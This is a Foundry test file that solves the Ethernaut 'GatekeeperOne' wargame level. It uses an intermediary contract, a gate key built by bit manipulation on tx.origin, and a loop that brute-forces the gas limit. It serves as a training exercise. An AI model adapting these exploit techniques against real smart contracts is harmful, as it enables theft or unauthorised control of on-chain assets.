// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "src/openzeppelin-ethernaut/GatekeeperOne.sol";

contract MiddleMan {
    function enter(address gatekeeperOne, bytes8 gateKey, uint256 gasLimit) public {
        GatekeeperOne(gatekeeperOne).enter{gas: gasLimit}(gateKey);
    }
}

// gateTwo: force cal. gas
// gateThree: analyse each digit as below
contract GatekeeperOneTest is Test {
    // GatekeeperOne instance = GatekeeperOne(vm.envAddress("GATEKEEPER_ONE"));
    GatekeeperOne instance;

    function setUp() public {
        instance = new GatekeeperOne();
    }

    function test() public {
        assertEq(instance.entrant(), address(0));

        MiddleMan middleMan = new MiddleMan();
        // MiddleMan middleMan = MiddleMan(vm.envAddress("GATEKEEPER_ONE_MIDDLEMAN"));

        // uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)): 32~16 == 0
        // uint32(uint64(_gateKey)) != uint64(_gateKey): 64~32 != 0; can add 1 to #32, i.e. 2 ** 32
        // uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)): 16~0 == tx.origin

        //    64    32    16         0
        //      != 0  == 0  tx.origin
        bytes8 gateKey = bytes8(uint64(uint16(uint160(tx.origin))) + 2 ** 32);

        for (uint256 i; i < 100000; i++) {
            try middleMan.enter(address(instance), gateKey, i) {
                // try middleMan.enter(address(instance), gateKey, 81910 + i) {
                if (instance.entrant() == tx.origin) {
                    console.log("i", i);
                    break;
                }
            } catch {}
        }

        assertEq(instance.entrant(), tx.origin);
    }
}
